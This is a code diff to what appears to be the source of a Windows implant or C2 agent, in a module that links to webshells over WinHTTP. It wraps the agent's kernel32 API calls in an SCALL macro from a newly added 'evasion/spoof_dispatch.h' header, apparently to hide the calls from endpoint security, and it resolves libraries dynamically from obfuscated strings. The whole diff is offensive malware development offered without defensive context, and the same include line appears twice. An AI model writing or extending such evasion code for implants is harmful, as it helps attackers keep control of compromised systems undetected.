@@ -7,6 +7,8 @@
 #include <base64.h>
 #include <crypto.h>
 #include <commands.h>
+#include <evasion/spoof_dispatch.h>
+#include <evasion/spoof_dispatch.h>
 
 #if defined( INCLUDE_CMD_LINK_WEBSHELL ) || defined( INCLUDE_CMD_UNLINK_WEBSHELL )
 
@@ -22,7 +24,7 @@ auto declfn starburst::ws_resolve_winhttp(
     memory::zero( &state->http, sizeof( WebshellHttpApis ) );
 
     char dll_name[] = { 'w','i','n','h','t','t','p','.','d','l','l', 0 };
-    state->h_winhttp = inst.kernel32.LoadLibraryA( dll_name );
+    state->h_winhttp = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, dll_name );
     if ( !state->h_winhttp ) return false;
 
     state->http.pWinHttpOpen = reinterpret_cast<ws_fn_WinHttpOpen>(
@@ -296,10 +298,10 @@ auto declfn starburst::ws_http_post(
 
     // convert host and path to wide strings
     wchar_t wide_host[256] = {};
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, parsed.host, -1, wide_host, 256 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, parsed.host, -1, wide_host, 256 );
 
     wchar_t wide_path[512] = {};
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, parsed.path, -1, wide_path, 512 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, parsed.path, -1, wide_path, 512 );
 
     // connect
     auto h_conn = state->http.pWinHttpConnect(
@@ -355,7 +357,7 @@ auto declfn starburst::ws_http_post(
             auto wide_hdr = static_cast<wchar_t*>(
                 inst.heap_alloc( ( hdr_len + 1 ) * sizeof( wchar_t ) ) );
             if ( wide_hdr ) {
-                inst.kernel32.MultiByteToWideChar( CP_ACP, 0, hdr_buf, -1,
+                SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, hdr_buf, -1,
                     wide_hdr, hdr_len + 1 );
                 state->http.pWinHttpAddRequestHeaders( h_req, wide_hdr,
                     static_cast<uint32_t>( -1 ),
@@ -376,7 +378,7 @@ auto declfn starburst::ws_http_post(
             auto wide_hdr = static_cast<wchar_t*>(
                 inst.heap_alloc( ( hdr_len + 1 ) * sizeof( wchar_t ) ) );
             if ( wide_hdr ) {
-                inst.kernel32.MultiByteToWideChar( CP_ACP, 0, hdr_buf, -1,
+                SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, hdr_buf, -1,
                     wide_hdr, hdr_len + 1 );
                 state->http.pWinHttpAddRequestHeaders( h_req, wide_hdr,
                     static_cast<uint32_t>( -1 ),
